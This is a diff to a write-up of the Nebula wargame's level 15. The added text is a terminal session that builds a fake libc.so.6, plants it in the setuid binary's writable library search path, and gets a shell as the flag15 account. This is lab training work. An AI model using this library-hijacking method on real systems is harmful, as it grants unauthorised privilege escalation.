@@ -22,3 +22,16 @@ Let's use it to invoke a shell [see source](fakelib.c)
 This library needs to have all its dependencies linked statically, whereas being a shared lib itself, hence the flags in [Makefile](Makefile).
 Note that the version information required by flag15 in the symbols : @@GLIBC_2.0
 The linker must be told through flags to use a version.map file: -Wl,--version-script=version.map
+
+```
+level15@nebula:~$ make
+gcc -shared -static-libgcc -Wl,--version-script=version.map,-Bstatic fakelib.c -o libfake.so
+level15@nebula:~$ make install
+mkdir -p /var/tmp/flag15/tls/i686/sse2/cmov/
+cp libfake.so /var/tmp/flag15/tls/i686/sse2/cmov//libc.so.6
+level15@nebula:~$ ../flag15/flag15 
+flag15@nebula:/home/level15$ getflag
+You have successfully executed getflag on a target account
+```
+
+
